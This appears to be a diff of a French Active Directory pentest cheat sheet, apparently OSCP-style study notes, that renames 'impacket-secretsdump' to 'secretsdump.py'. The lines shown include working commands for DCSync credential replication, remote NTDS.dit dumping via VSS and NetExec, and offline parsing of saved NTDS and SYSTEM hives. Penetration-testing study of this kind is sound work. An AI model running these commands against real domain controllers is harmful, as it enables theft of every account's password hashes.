@@ -4,13 +4,13 @@ Imite un DC pour demander la réplication des credentials d'un utilisateur via l
 
 **Droits requis** : `Replicating Directory Changes` + `Replicating Directory Changes All`. Par défaut : membres de **Domain Admins**, **Enterprise Admins**, **Administrators**.
 
-**Depuis Kali (impacket-secretsdump)**
+**Depuis Kali (secretsdump.py)**
 
 ```bash
-impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:''PASSWORD''@IP_DC
+secretsdump.py -just-dc-user dave corp.com/jeffadmin:''PASSWORD''@IP_DC
 
 # Dump tous les comptes
-impacket-secretsdump corp.com/jeffadmin:'PASSWORD'@IP_DC
+secretsdump.py corp.com/jeffadmin:'PASSWORD'@IP_DC
 ```
 
 **Depuis Kali (NetExec)**
@@ -50,13 +50,13 @@ Deux méthodes pour extraire tous les hashes du domaine :
 
 ```bash
 # VSS method -  crée la shadow copy à distance et parse NTDS.dit
-impacket-secretsdump -use-vss corp.com/'DA_USER':'PASSWORD'@'IP_DC'
+secretsdump.py -use-vss corp.com/'DA_USER':'PASSWORD'@'IP_DC'
 
 # ou via nxc
 nxc smb 'IP_DC' -u 'DA_USER' -p 'PASSWORD' --ntds vss
 
 # Sans VSS -  DCSync direct (plus rapide, pas de shadow copy)
-impacket-secretsdump corp.com/'DA_USER':'PASSWORD'@'IP_DC'
+secretsdump.py corp.com/'DA_USER':'PASSWORD'@'IP_DC'
 nxc smb 'IP_DC' -u 'DA_USER' -p 'PASSWORD' --ntds
 ```
 
@@ -94,6 +94,6 @@ reg save HKLM\SYSTEM C:\Users\offsec\SYSTEM.hiv
 Transférer les deux fichiers sur Kali puis parser :
 
 ```bash
-impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+secretsdump.py -ntds ntds.dit.bak -system system.bak LOCAL
 ```
 
